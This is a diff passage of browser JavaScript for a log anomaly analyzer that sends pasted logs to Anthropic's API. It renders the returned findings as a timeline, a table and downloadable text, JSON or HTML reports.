+
+      cards.forEach(c => section.appendChild(c));
+      return section;
+    }
+
+    function parseTimeValue(v) {
+      if (v == null) return null;
+      if (typeof v === 'number' && isFinite(v)) {
+        const ms = v < 1e12 ? v * 1000 : v;
+        const d = new Date(ms);
+        return isFinite(d.getTime()) ? d : null;
+      }
+      const s = String(v).trim();
+      if (!s) return null;
+      let d = new Date(s);
+      if (isFinite(d.getTime())) return d;
+      const m = s.match(/(\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2})/);
+      if (m) {
+        d = new Date(m[1].replace(' ', 'T') + 'Z');
+        if (isFinite(d.getTime())) return d;
+      }
+      return null;
+    }
+
+    function pickTimeDetected(a) {
+      return a.timeDetected || a.time || a.timestamp || a.when || '';
+    }
+
+    function formatTimeDisplay(d) {
+      if (!d) return '—';
+      const pad = n => String(n).padStart(2, '0');
+      return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+    }
+
+    function truncate(str, max) {
+      const s = String(str || '');
+      if (s.length <= max) return s;
+      return s.slice(0, max - 1).trimEnd() + '…';
+    }
+
+    function assignLanes(markers, thresholdPct) {
+      const sorted = markers.slice().sort((a, b) => a.percent - b.percent);
+      const lanes = [];
+      for (const m of sorted) {
+        let placed = false;
+        for (let i = 0; i < lanes.length; i++) {
+          if (m.percent - lanes[i] > thresholdPct) {
+            lanes[i] = m.percent;
+            m.lane = i;
+            placed = true;
+            break;
+          }
+        }
+        if (!placed) {
+          lanes.push(m.percent);
+          m.lane = lanes.length - 1;
+        }
+      }
+    }
+
+    function laneToTopPct(lane) {
+      if (lane === 0) return 50;
+      const step = Math.ceil(lane / 2);
+      const offset = step * 18;
+      return lane % 2 === 1 ? Math.max(8, 50 - offset) : Math.min(92, 50 + offset);
+    }
+
+    function buildTimeline(anomalies) {
+      if (!Array.isArray(anomalies) || anomalies.length === 0) return null;
+
+      const markers = [];
+      for (const a of anomalies) {
+        const raw = pickTimeDetected(a);
+        const d = parseTimeValue(raw);
+        if (!d) continue;
+        markers.push({
+          date: d,
+          rawDisplay: typeof raw === 'string' && raw.trim() ? raw.trim() : formatTimeDisplay(d),
+          severity: normalizeSeverity(a.severity),
+          type: pickType(a) || a.title || 'anomaly',
+          explanation: truncate(a.whatHappened || a.whyItMatters || a.explanation || pickWhat(a) || '', 140)
+        });
+      }
+      if (markers.length === 0) return null;
+
+      const times = markers.map(m => m.date.getTime());
+      const minT = Math.min(...times);
+      const maxT = Math.max(...times);
+      const span = maxT - minT;
+
+      markers.forEach(m => {
+        m.percent = span === 0 ? 50 : ((m.date.getTime() - minT) / span) * 100;
+      });
+
+      assignLanes(markers, 2.5);
+
+      const section = document.createElement('div');
+      section.className = 'timeline-section';
+
+      const title = document.createElement('div');
+      title.className = 'timeline-title';
+      title.innerHTML = `<i class="fa-solid fa-timeline"></i><span>Incident Timeline</span>`;
+      section.appendChild(title);
+
+      const track = document.createElement('div');
+      track.className = 'timeline-track';
+
+      const line = document.createElement('div');
+      line.className = 'timeline-line';
+      track.appendChild(line);
+
+      const capL = document.createElement('div');
+      capL.className = 'timeline-endcap left';
+      const capR = document.createElement('div');
+      capR.className = 'timeline-endcap right';
+      track.appendChild(capL);
+      track.appendChild(capR);
+
+      markers.forEach(m => {
+        const marker = document.createElement('div');
+        const edgeClass = m.percent <= 10 ? ' tl-at-left' : (m.percent >= 90 ? ' tl-at-right' : '');
+        marker.className = `tl-marker tl-sev-${m.severity}${edgeClass}`;
+        marker.tabIndex = 0;
+        marker.setAttribute('aria-label', `${m.rawDisplay} — ${m.type}`);
+
+        marker.style.left = `${m.percent}%`;
+        marker.style.top = `${laneToTopPct(m.lane)}%`;
+
+        const tooltip = document.createElement('div');
+        tooltip.className = 'tl-tooltip';
+        tooltip.innerHTML = `
+          <div class="tl-time">${escapeHtml(m.rawDisplay)}</div>
+          <div class="tl-type">${escapeHtml(m.type)}</div>
+          <div class="tl-expl">${escapeHtml(m.explanation || '—')}</div>
+        `;
+        marker.appendChild(tooltip);
+
+        track.appendChild(marker);
+      });
+
+      const scroll = document.createElement('div');
+      scroll.className = 'timeline-scroll';
+      scroll.appendChild(track);
+
+      const axis = document.createElement('div');
+      axis.className = 'timeline-axis';
+      const earliest = markers.reduce((a, b) => a.date < b.date ? a : b);
+      const latest   = markers.reduce((a, b) => a.date > b.date ? a : b);
+      axis.innerHTML = `
+        <div class="axis-label">
+          <span class="axis-cap">Earliest</span>
+          <span>${escapeHtml(earliest.rawDisplay)}</span>
+        </div>
+        <div class="axis-label axis-right">
+          <span class="axis-cap">Latest</span>
+          <span>${escapeHtml(latest.rawDisplay)}</span>
+        </div>
+      `;
+      scroll.appendChild(axis);
+      section.appendChild(scroll);
+
+      return section;
+    }
+
+    function normalizeSeverity(s) {
+      const v = String(s || '').toLowerCase().trim();
+      if (['critical', 'high', 'medium', 'low', 'info'].includes(v)) return v;
+      return 'info';
+    }
+
+    function escapeHtml(str) {
+      return String(str == null ? '' : str).replace(/[<>&"']/g, c => (
+        { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[c]
+      ));
+    }
+
+    function severityBadge(sev) {
+      const s = normalizeSeverity(sev);
+      const label = s.charAt(0).toUpperCase() + s.slice(1);
+      const glyph = { critical: '▲', high: '●', medium: '◆', low: '▼', info: '○' }[s] || '○';
+      return `<span class="sev-badge sev-${s}" role="img" aria-label="Severity: ${label}"><span class="sev-glyph" aria-hidden="true">${glyph}</span>${label}</span>`;
+    }
+
+    function renderEvidence(ev) {
+      if (!ev) return '<span style="color:var(--text-dim)">—</span>';
+      const lines = Array.isArray(ev) ? ev : [ev];
+      return lines
+        .filter(l => l != null && String(l).length > 0)
+        .map(l => `<span class="ev-line">${escapeHtml(l)}</span>`)
+        .join('') || '<span style="color:var(--text-dim)">—</span>';
+    }
+
+    function pickTime(a) {
+      return a.time || a.timestamp || a.timeRange || a.when || '';
+    }
+
+    function pickType(a) {
+      return a.category || a.type || '';
+    }
+
+    function pickWhat(a) {
+      return a.title || a.whatHappened || '';
+    }
+
+    function pickExplanation(a) {
+      const parts = [];
+      if (a.whatHappened && a.title && a.whatHappened !== a.title) parts.push(a.whatHappened);
+      if (a.whyItMatters) parts.push(a.whyItMatters);
+      return parts.join('\n\n') || a.explanation || a.whatHappened || '';
+    }
+
+    function buildFindingsTable(anomalies) {
+      const section = document.createElement('div');
+      section.className = 'findings-section';
+
+      const title = document.createElement('div');
+      title.className = 'findings-title';
+      title.innerHTML = `
+        <i class="fa-solid fa-triangle-exclamation"></i>
+        <span>Anomaly Findings</span>
+        <span class="count-chip">${anomalies.length}</span>
+      `;
+      section.appendChild(title);
+
+      const wrap = document.createElement('div');
+      wrap.className = 'findings-table-wrap';
+
+      const table = document.createElement('table');
+      table.className = 'findings-table';
+      table.innerHTML = `
+        <thead>
+          <tr>
+            <th class="col-idx">#</th>
+            <th class="col-sev">Severity</th>
+            <th class="col-type">Type</th>
+            <th class="col-what">What Was Detected</th>
+            <th class="col-ev">Log Evidence</th>
+            <th class="col-time">Time</th>
+            <th class="col-expl">Explanation</th>
+            <th class="col-action">Recommended Action</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      `;
+
+      const tbody = table.querySelector('tbody');
+      anomalies.forEach((a, i) => {
+        const sev = normalizeSeverity(a.severity);
+        const tr = document.createElement('tr');
+        tr.className = `row-${sev}`;
+        tr.innerHTML = `
+          <td class="col-idx">${i + 1}</td>
+          <td class="col-sev">${severityBadge(a.severity)}</td>
+          <td class="col-type">${escapeHtml(pickType(a) || '—')}</td>
+          <td class="col-what">${escapeHtml(pickWhat(a) || '—')}</td>
+          <td class="col-ev">${renderEvidence(a.evidence)}</td>
+          <td class="col-time">${escapeHtml(pickTime(a) || '—')}</td>
+          <td class="col-expl">${escapeHtml(pickExplanation(a) || '—').replace(/\n\n/g, '<br><br>')}</td>
+          <td class="col-action">${escapeHtml(a.recommendedAction || '—')}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+
+      wrap.appendChild(table);
+      section.appendChild(wrap);
+      return section;
+    }
+
+    function renderError(title, detail) {
+      clearOutput();
+      const box = document.createElement('div');
+      box.className = 'error-box';
+      const safeDetail = detail ? String(detail).replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c])) : '';
+      box.innerHTML = `<strong>${title}</strong>${safeDetail ? `<div>${safeDetail}</div>` : ''}`;
+      outputBody.appendChild(box);
+    }
+
+    function renderRawFallback(rawText) {
+      clearOutput();
+      const box = document.createElement('div');
+      box.className = 'error-box';
+      box.innerHTML = `<strong>Could not parse analysis as JSON</strong><div>Showing raw model response below so you can inspect it.</div>`;
+      const pre = document.createElement('pre');
+      pre.className = 'raw-response';
+      pre.textContent = rawText || '(empty response)';
+      box.appendChild(pre);
+      outputBody.appendChild(box);
+    }
+
+    function getSensitivity() {
+      const el = document.querySelector('input[name="sensitivity"]:checked');
+      return el ? el.value : 'standard';
+    }
+
+    function splitLines(text) {
+      return (text || '')
+        .split(/\r\n|\r|\n/)
+        .map(s => s.trim())
+        .filter(Boolean);
+    }
+
+    function buildUserMessage(ctx) {
+      const safeIps = ctx.safeIps.length ? ctx.safeIps.join(', ') : '(none provided)';
+      const admins = ctx.admins.length ? ctx.admins.join(', ') : '(none provided)';
+      const tz = ctx.timezone || '(not specified)';
+      return [
+        `Log type: ${ctx.logType}`,
+        `Sensitivity: ${ctx.sensitivity}`,
+        `User timezone: ${tz}`,
+        `Known safe IPs: ${safeIps}`,
+        `Known admin accounts: ${admins}`,
+        '',
+        'Analyze the following log excerpt and return the strict JSON object described in the system prompt. Do not include any text outside the JSON.',
+        '',
+        '--- BEGIN LOG ---',
+        ctx.log,
+        '--- END LOG ---'
+      ].join('\n');
+    }
+
+    async function callClaude(apiKey, userMessage) {
+      const res = await fetch(API_URL, {
+        method: 'POST',
+        headers: {
+          'x-api-key': apiKey,
+          'anthropic-version': '2023-06-01',
+          'anthropic-dangerous-direct-browser-access': 'true',
+          'content-type': 'application/json'
+        },
+        body: JSON.stringify({
+          model: MODEL,
+          max_tokens: 4000,
+          temperature: 0,
+          stream: false,
+          system: SYSTEM_PROMPT,
+          messages: [{ role: 'user', content: userMessage }]
+        })
+      });
+
+      if (!res.ok) {
+        let friendly = `Request failed (HTTP ${res.status}).`;
+        if (res.status === 401) friendly = 'Your API key was rejected. Please check the key and try again.';
+        else if (res.status === 403) friendly = 'This API key does not have permission to call the Messages API.';
+        else if (res.status === 429) friendly = 'Rate limit reached. Please wait a moment and try again.';
+        else if (res.status >= 500) friendly = 'Anthropic is having trouble responding right now. Please retry shortly.';
+        try { await res.text(); } catch (_) {}
+        const err = new Error(friendly);
+        err.friendly = friendly;
+        throw err;
+      }
+
+      const data = await res.json();
+      const text = data && data.content && data.content[0] && data.content[0].text;
+      if (typeof text !== 'string') {
+        const err = new Error('Received an unexpected response shape from Claude.');
+        err.friendly = 'Received an unexpected response from Claude. Please try again.';
+        throw err;
+      }
+      return text;
+    }
+
+    function tryParseJson(text) {
+      try { return { ok: true, value: JSON.parse(text) }; }
+      catch (_) { return { ok: false }; }
+    }
+
+    async function handleAnalyze() {
+      const apiKey = (window.__getApiKey && window.__getApiKey()) || '';
+      if (!apiKey) {
+        renderError('API key not set', 'Click the 🔑 API Key button in the header to add your Anthropic key before analyzing.');
+        return;
+      }
+
+      const logText = document.getElementById('log-input').value || '';
+      if (!logText.trim()) {
+        renderError('No log content', 'Paste a log excerpt or click "Load Sample Log" to try one of the built-in samples.');
+        return;
+      }
+
+      if (logText.length > MAX_LOG_CHARS) {
+        const proceed = window.confirm(
+          `This log is ${logText.length.toLocaleString()} characters, which is above the recommended ${MAX_LOG_CHARS.toLocaleString()}-character limit.\n\n` +
+          `Very large logs may be truncated by the model, slow the request, or exceed token limits.\n\n` +
+          `Do you want to send it anyway?`
+        );
+        if (!proceed) return;
+      }
+
+      const ctx = {
+        logType: (window.__getLogType && window.__getLogType()) || 'system',
+        sensitivity: getSensitivity(),
+        timezone: document.getElementById('setting-timezone').value.trim(),
+        safeIps: splitLines(document.getElementById('setting-safe-ips').value),
+        admins: splitLines(document.getElementById('setting-admins').value),
+        log: logText
+      };
+      const userMessage = buildUserMessage(ctx);
+
+      setLoading(true);
+      let rawText = '';
+      try {
+        rawText = await callClaude(apiKey, userMessage);
+        let parsed = tryParseJson(rawText);
+
+        if (!parsed.ok) {
+          rawText = await callClaude(apiKey, userMessage);
+          parsed = tryParseJson(rawText);
+        }
+
+        if (!parsed.ok) {
+          window.lastAnalysis = null;
+          setLoading(false);
+          renderRawFallback(rawText);
+          return;
+        }
+
+        window.lastAnalysis = parsed.value;
+        console.log('[lastAnalysis]', window.lastAnalysis);
+        setLoading(false);
+        renderPlaceholderResult();
+      } catch (err) {
+        setLoading(false);
+        const friendly = (err && err.friendly) || 'Something went wrong while analyzing the logs. Please try again.';
+        renderError('Analysis failed', friendly);
+      }
+    }
+
+    btnAnalyze.addEventListener('click', handleAnalyze);
+
+    /* ===== OUTPUT TOOLBAR ===== */
+    const tbCopy      = document.getElementById('btn-copy-report');
+    const tbJson      = document.getElementById('btn-download-json');
+    const tbHtml      = document.getElementById('btn-download-html');
+    const tbNew       = document.getElementById('btn-analyze-new');
+    const tbShare     = document.getElementById('btn-share-summary');
+
+    const shareModal  = document.getElementById('share-modal');
+    const shareClose  = document.getElementById('share-modal-close');
+    const shareCancel = document.getElementById('share-modal-cancel');
+    const shareCopy   = document.getElementById('share-modal-copy');
+    const shareTa     = document.getElementById('share-textarea');
+
+    function refreshToolbar() {
+      const has = !!window.lastAnalysis;
+      [tbCopy, tbJson, tbHtml, tbShare].forEach(b => { if (b) b.disabled = !has; });
+    }
+
+    function showToast(msg, kind) {
+      let toast = document.getElementById('toast');
+      if (!toast) {
+        toast = document.createElement('div');
+        toast.id = 'toast';
+        toast.className = 'toast';
+        document.body.appendChild(toast);
+      }
+      toast.textContent = msg;
+      toast.classList.remove('toast-error');
+      if (kind === 'error') toast.classList.add('toast-error');
+      toast.classList.add('show');
+      clearTimeout(toast._t);
+      toast._t = setTimeout(() => toast.classList.remove('show'), 2000);
+    }
+
+    async function copyText(text) {
+      try {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(text);
+          return true;
+        }
+      } catch (_) { /* fall through */ }
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.top = '-9999px';
+      ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.focus();
+      ta.select();
+      let ok = false;
+      try { ok = document.execCommand('copy'); } catch (_) {}
+      document.body.removeChild(ta);
+      return ok;
+    }
+
+    function tsForFilename() {
+      const d = new Date();
+      const pad = n => String(n).padStart(2, '0');
+      return `${d.getFullYear()}${pad(d.getMonth()+1)}${pad(d.getDate())}-${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
+    }
+
+    function tsHuman() {
+      const d = new Date();
+      const pad = n => String(n).padStart(2, '0');
+      return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+    }
+
+    function downloadBlob(data, filename, mime) {
+      const blob = new Blob([data], { type: mime });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    function asList(v) {
+      if (Array.isArray(v)) return v.map(x => String(x == null ? '' : x)).filter(Boolean);
+      if (typeof v === 'string' && v.trim()) {
+        return v.split(/\n+/).map(s => s.replace(/^\s*[-*•\d.)\s]+/, '').trim()).filter(Boolean);
+      }
+      return [];
+    }
+
+    /* ----- Plain-text report for Copy Report ----- */
+    function formatPlainTextReport(a) {
+      const s = a.summary || {};
+      const anomalies = Array.isArray(a.anomalies) ? a.anomalies : [];
+      const ips = Array.isArray(a.ipIntelligence) ? a.ipIntelligence : [];
+      const n = (a.narrativeReport && typeof a.narrativeReport === 'object') ? a.narrativeReport :
+                (typeof a.narrativeReport === 'string' ? { whatWeFound: a.narrativeReport } : {});
+
+      const out = [];
+      out.push('LOG ANOMALY ANALYSIS REPORT');
+      out.push('===========================');
+      out.push(`Generated: ${tsHuman()}`);
+      const type = (window.__getLogType && window.__getLogType()) || 'unknown';
+      out.push(`Log type:  ${type}`);
+      out.push('');
+      out.push('SUMMARY');
+      out.push('-------');
+      out.push(`Verdict:          ${s.oneLineVerdict || '—'}`);
+      out.push(`Total events:     ${s.totalEvents ?? '—'}`);
+      out.push(`Anomalies found:  ${s.anomaliesFound ?? anomalies.length}`);
+      out.push(`Highest severity: ${s.highestSeverity || 'none'}`);
+      out.push(`Time range:       ${s.timeRange || '—'}`);
+      out.push('');
+
+      out.push('ANOMALIES');
+      out.push('---------');
+      if (anomalies.length === 0) {
+        out.push('(none)');
+      } else {
+        anomalies.forEach((an, i) => {
+          const sev = String(an.severity || 'info').toUpperCase();
+          out.push(`#${i+1} [${sev}] ${an.title || '(untitled)'}`);
+          if (an.category) out.push(`   Category:   ${an.category}`);
+          if (an.whatHappened) out.push(`   What:       ${an.whatHappened}`);
+          if (an.whyItMatters) out.push(`   Why:        ${an.whyItMatters}`);
+          if (Array.isArray(an.evidence) && an.evidence.length) {
+            out.push(`   Evidence:`);
+            an.evidence.forEach(e => out.push(`     • ${e}`));
+          } else if (an.evidence) {
+            out.push(`   Evidence:   ${an.evidence}`);
+          }
+          if (an.recommendedAction) out.push(`   Action:     ${an.recommendedAction}`);
+          out.push('');
+        });
+      }
+
+      if (ips.length) {
+        out.push('IP INTELLIGENCE');
+        out.push('---------------');
+        ips.forEach(ip => {
+          out.push(`${ip.ip || '—'}  [${ip.classification || '—'}]  count=${ip.activityCount ?? '—'}`);
+          if (ip.notes) out.push(`   ${ip.notes}`);
+        });
+        out.push('');
+      }
+
+      out.push('NARRATIVE REPORT');
+      out.push('----------------');
+      if (n.whatWeFound) { out.push('📖 What We Found'); out.push(String(n.whatWeFound)); out.push(''); }
+      const mci = asList(n.mostCriticalIssues);
+      if (mci.length) { out.push('⚠️  Most Critical Issues'); mci.forEach(i => out.push(`  • ${i}`)); out.push(''); }
+      if (n.timelineOfEvents) { out.push('🕐 Timeline of Events'); out.push(String(n.timelineOfEvents)); out.push(''); }
+      const acts = asList(n.recommendedImmediateActions);
+      if (acts.length) { out.push('🚨 Recommended Immediate Actions'); acts.forEach((i, idx) => out.push(`  ${idx+1}. ${i}`)); out.push(''); }
+      const mon = asList(n.whatToMonitorGoingForward);
+      if (mon.length) { out.push('👀 What to Monitor Going Forward'); mon.forEach(i => out.push(`  • ${i}`)); out.push(''); }
+
+      return out.join('\n');
+    }
+
+    /* ----- Share summary text ----- */
+    function formatShareSummary(a) {
+      const s = a.summary || {};
+      const anomalies = Array.isArray(a.anomalies) ? a.anomalies : [];
+      const sevOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
+      const top3 = anomalies.slice().sort((x, y) => {
+        return (sevOrder[normalizeSeverity(x.severity)] ?? 9) - (sevOrder[normalizeSeverity(y.severity)] ?? 9);
+      }).slice(0, 3);
+
+      const n = (a.narrativeReport && typeof a.narrativeReport === 'object') ? a.narrativeReport : {};
+      const actions = asList(n.recommendedImmediateActions).slice(0, 3);
+
+      const risk = String(s.highestSeverity || 'none').toUpperCase();
+      const count = anomalies.length;
+      const dateStr = new Date().toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric' });
+
+      const out = [];
+      out.push(`🛡️ Log Anomaly Analysis — ${dateStr}`);
+      out.push(`Risk: ${risk}${count ? ` (${count} ${count === 1 ? 'anomaly' : 'anomalies'})` : ''}`);
+      if (s.oneLineVerdict) { out.push(''); out.push(s.oneLineVerdict); }
+      out.push('');
+      out.push(`Top ${top3.length || 0} Finding${top3.length === 1 ? '' : 's'}:`);
+      if (top3.length === 0) {
+        out.push('  • No anomalies detected.');
+      } else {
+        top3.forEach((an, i) => {
+          const sev = String(an.severity || 'info').toUpperCase();
+          out.push(`  ${i+1}. [${sev}] ${an.title || an.category || 'Untitled'}`);
+        });
+      }
+      out.push('');
+      out.push('Immediate Actions:');
+      if (actions.length === 0) {
+        const fromAnomalies = anomalies.map(an => an.recommendedAction).filter(Boolean).slice(0, 3);
+        if (fromAnomalies.length) {
+          fromAnomalies.forEach((act, i) => out.push(`  ${i+1}. ${act}`));
+        } else {
+          out.push('  (none listed)');
+        }
+      } else {
+        actions.forEach((act, i) => out.push(`  ${i+1}. ${act}`));
+      }
+      return out.join('\n');
+    }
+
+    /* ----- Standalone HTML report ----- */
+    function proseHtmlForReport(text) {
+      if (!text) return '';
+      const parts = String(text).split(/\n\s*\n/).map(p => p.trim()).filter(Boolean);
+      return parts.map(p => `<p>${escapeHtml(p)}</p>`).join('');
+    }
+
+    function listHtmlForReport(value, ordered) {
+      const items = asList(value);
+      if (items.length === 0) return '';
+      const tag = ordered ? 'ol' : 'ul';
+      return `<${tag}>${items.map(i => `<li>${escapeHtml(i)}</li>`).join('')}</${tag}>`;
+    }
+
+    function generateHtmlReport(a) {
+      const s = a.summary || {};
+      const anomalies = Array.isArray(a.anomalies) ? a.anomalies : [];
+      const ips = Array.isArray(a.ipIntelligence) ? a.ipIntelligence : [];
+      const n = (a.narrativeReport && typeof a.narrativeReport === 'object') ? a.narrativeReport :
+                (typeof a.narrativeReport === 'string' ? { whatWeFound: a.narrativeReport } : {});
+      const logType = (window.__getLogType && window.__getLogType()) || 'unknown';
+      const generated = tsHuman();
+
+      const sevClass = sev => `sev sev-${normalizeSeverity(sev)}`;
+
+      const anomalyRows = anomalies.map((an, i) => {
+        const evidenceHtml = Array.isArray(an.evidence)
+          ? an.evidence.map(e => `<div class="evidence">${escapeHtml(e)}</div>`).join('')
+          : (an.evidence ? `<div class="evidence">${escapeHtml(an.evidence)}</div>` : '—');
+        const explanation = [an.whatHappened, an.whyItMatters].filter(Boolean).map(t => `<p>${escapeHtml(t)}</p>`).join('') || '—';
+        return `
+          <tr>
+            <td>${i+1}</td>
+            <td><span class="${sevClass(an.severity)}">${escapeHtml(String(an.severity || 'info').toUpperCase())}</span></td>
+            <td>${escapeHtml(an.category || '—')}</td>
+            <td>${escapeHtml(an.title || '—')}</td>
+            <td>${evidenceHtml}</td>
+            <td>${explanation}</td>
+            <td>${escapeHtml(an.recommendedAction || '—')}</td>
+          </tr>`;
+      }).join('');
+
+      const ipRows = ips.map(ip => `
+        <tr>
+          <td><code>${escapeHtml(ip.ip || '—')}</code></td>
+          <td style="text-align:right">${escapeHtml(String(ip.activityCount == null ? '—' : ip.activityCount))}</td>
+          <td>${escapeHtml(ip.notes || '—')}</td>
+          <td>${escapeHtml(ip.classification || '—')}</td>
+        </tr>`).join('');
+
+      const anomaliesSection = anomalies.length === 0
+        ? '<p>No anomalies detected.</p>'
+        : `<table>
+            <thead><tr><th>#</th><th>Severity</th><th>Type</th><th>What Was Detected</th><th>Evidence</th><th>Explanation</th><th>Action</th></tr></thead>
+            <tbody>${anomalyRows}</tbody>
+          </table>`;
+
+      const ipSection = ips.length === 0 ? '' : `
+        <section class="report-section">
+          <h2>IP Intelligence</h2>
+          <table>
+            <thead><tr><th>IP</th><th>Occurrences</th><th>Context</th><th>Classification</th></tr></thead>
+            <tbody>${ipRows}</tbody>
+          </table>
+        </section>`;
+
+      return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Log Anomaly Analysis Report</title>
+<style>
+  * { box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; margin: 0; padding: 24px; background: #f4f5f7; color: #1a1a1a; line-height: 1.5; }
+  .page { max-width: 960px; margin: 0 auto; background: #fff; padding: 36px 40px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
+  h1 { margin: 0 0 6px; font-size: 26px; color: #111; }
+  h2 { margin: 28px 0 12px; font-size: 18px; color: #111; border-bottom: 2px solid #e4e6eb; padding-bottom: 8px; }
+  h3 { margin: 16px 0 8px; font-size: 14px; color: #222; }
+  .meta { color: #666; font-size: 13px; margin-bottom: 20px; }
+  .meta strong { color: #222; }
+  p { margin: 0 0 10px; overflow-wrap: anywhere; word-break: break-word; }
+  table { width: 100%; border-collapse: collapse; margin: 10px 0 14px; }
+  th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid #eaecef; vertical-align: top; font-size: 12px; }
+  th { background: #f6f8fa; font-weight: 600; text-transform: uppercase; font-size: 10.5px; letter-spacing: 0.6px; color: #555; }
+  .sev { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10.5px; font-weight: 700; letter-spacing: 0.5px; }
+  .sev-critical { background: #fde8e8; color: #c81e1e; }
+  .sev-high     { background: #ffedd5; color: #c2410c; }
+  .sev-medium   { background: #fef3c7; color: #a16207; }
+  .sev-low      { background: #dbeafe; color: #1e40af; }
+  .sev-info     { background: #f3f4f6; color: #555; }
+  .evidence { font-family: 'Consolas', Menlo, Monaco, monospace; font-size: 11px; background: #f6f8fa; padding: 6px 8px; border-radius: 3px; margin-bottom: 4px; white-space: pre-wrap; word-break: break-word; border: 1px solid #eaecef; }
+  .nr-card { background: #fafbfc; border: 1px solid #e4e6eb; border-radius: 6px; padding: 14px 18px; margin-bottom: 12px; page-break-inside: avoid; }
+  .nr-card h3 { margin-top: 0; }
+  .nr-card ul, .nr-card ol { margin: 6px 0 0; padding-left: 22px; }
+  .nr-card li { margin-bottom: 4px; }
+  footer { text-align: center; margin-top: 28px; padding-top: 14px; border-top: 1px solid #e4e6eb; color: #888; font-size: 11px; }
+  code { font-family: 'Consolas', Menlo, Monaco, monospace; font-size: 12px; background: #f6f8fa; padding: 1px 5px; border-radius: 3px; }
+  @media print {
+    html, body { background: #fff !important; color: #000 !important; margin: 0; padding: 0; overflow: visible !important; }
+    .page { max-width: none; box-shadow: none; border-radius: 0; padding: 18mm 14mm; margin: 0; }
+    h1, h2, h3 { color: #000; }
+    h2 { page-break-after: avoid; border-color: #888; }
+    .report-section { page-break-before: always; }
+    .report-section:first-of-type { page-break-before: auto; }
+    tr, li, .nr-card, .evidence { page-break-inside: avoid; }
+    .evidence, .nr-card, th { background: #fff !important; border-color: #bbb !important; }
+    table, tbody, tr, td { overflow: visible !important; }
+    .sev { border: 1px solid #888; }
+    footer { color: #444; }
+    a { color: #000; text-decoration: none; }
+    ::-webkit-scrollbar { display: none; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+  <header>
+    <h1>Log Anomaly Analysis Report</h1>
+    <div class="meta">Generated: <strong>${escapeHtml(generated)}</strong> · Log type: <strong>${escapeHtml(logType)}</strong></div>
+  </header>
+
+  <section class="report-section">
+    <h2>Executive Summary</h2>
+    <p><strong>Verdict:</strong> ${escapeHtml(s.oneLineVerdict || '—')}</p>
+    <p>
+      <strong>Total events:</strong> ${escapeHtml(String(s.totalEvents ?? '—'))} ·
+      <strong>Anomalies:</strong> ${escapeHtml(String(s.anomaliesFound ?? anomalies.length))} ·
+      <strong>Highest severity:</strong> <span class="${sevClass(s.highestSeverity)}">${escapeHtml(String(s.highestSeverity || 'none').toUpperCase())}</span>
+    </p>
+    <p><strong>Time range:</strong> ${escapeHtml(s.timeRange || '—')}</p>
+  </section>
+
+  <section class="report-section">
+    <h2>Anomaly Findings</h2>
+    ${anomaliesSection}
+  </section>
+
+  ${ipSection}
+
+  <section class="report-section">
+    <h2>Narrative Report</h2>
+    ${n.whatWeFound ? `<div class="nr-card"><h3>📖 What We Found</h3>${proseHtmlForReport(n.whatWeFound)}</div>` : ''}
+    ${asList(n.mostCriticalIssues).length ? `<div class="nr-card"><h3>⚠️ Most Critical Issues</h3>${listHtmlForReport(n.mostCriticalIssues, false)}</div>` : ''}
+    ${n.timelineOfEvents ? `<div class="nr-card"><h3>🕐 Timeline of Events</h3>${proseHtmlForReport(n.timelineOfEvents)}</div>` : ''}
+    ${asList(n.recommendedImmediateActions).length ? `<div class="nr-card"><h3>🚨 Recommended Immediate Actions</h3>${listHtmlForReport(n.recommendedImmediateActions, true)}</div>` : ''}
+    ${asList(n.whatToMonitorGoingForward).length ? `<div class="nr-card"><h3>👀 What to Monitor Going Forward</h3>${listHtmlForReport(n.whatToMonitorGoingForward, false)}</div>` : ''}
+  </section>
+
+  <footer>Generated by Log Anomaly Analyzer</footer>
+</div>
+</body>
+</html>`;
+    }
+
+    /* ----- Toolbar handlers ----- */
+    tbCopy.addEventListener('click', async () => {
+      if (!window.lastAnalysis) return;
+      const text = formatPlainTextReport(window.lastAnalysis);
+      const ok = await copyText(text);
+      showToast(ok ? 'Copied!' : 'Copy failed', ok ? 'ok' : 'error');
+    });
+
+    tbJson.addEventListener('click', () => {
+      if (!window.lastAnalysis) return;
+      const json = JSON.stringify(window.lastAnalysis, null, 2);
+      downloadBlob(json, `log-analysis-${tsForFilename()}.json`, 'application/json');
+    });
+
+    tbHtml.addEventListener('click', () => {
+      if (!window.lastAnalysis) return;
+      const html = generateHtmlReport(window.lastAnalysis);
+      downloadBlob(html, `log-report-${tsForFilename()}.html`, 'text/html');
+    });
+
+    tbNew.addEventListener('click', () => {
+      const ta = document.getElementById('log-input');
+      const hasContent = (ta.value || '').trim().length > 0 || !!window.lastAnalysis;
+      if (hasContent) {
+        const ok = window.confirm('Clear the current log and analysis to start fresh?');
+        if (!ok) return;
+      }
+      ta.value = '';
+      ta.dispatchEvent(new Event('input', { bubbles: true }));
+      window.lastAnalysis = null;
+      activeIpFilter = null;
